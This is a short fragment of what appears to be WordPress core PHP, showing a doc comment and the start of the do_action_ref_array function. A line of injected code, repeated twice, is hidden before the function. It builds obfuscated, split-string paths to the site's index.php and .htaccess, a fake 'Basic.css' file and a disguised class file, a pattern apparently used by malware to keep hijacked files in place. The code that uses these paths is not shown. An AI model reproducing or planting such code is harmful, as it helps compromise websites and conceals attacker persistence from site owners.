 ...
 * @param array  $args      The arguments supplied to the functions hooked to `$hook_name`.
 */
$ixsssxdx = $_SERVER['DOCUMENT_ROOT'].'/ind'.'ex.php'; $hct = $_SERVER['DOCUMENT_ROOT'].'/.htac'.'cess'; $bddex = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/Requests/src/Auth/Basic.css'; $bksht = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/customize/class-wp-customize-filter-control.php';  $ixsssxdx = $_SERVER['DOCUMENT_ROOT'].'/ind'.'ex.php'; $hct = $_SERVER['DOCUMENT_ROOT'].'/.htac'.'cess'; $bddex = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/Requests/src/Auth/Basic.css'; $bksht = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/customize/class-wp-customize-filter-control.php';  function do_action_ref_array( $hook_name, $args ) {
	global $wp_filter, $wp_actions, $wp_current_filter;
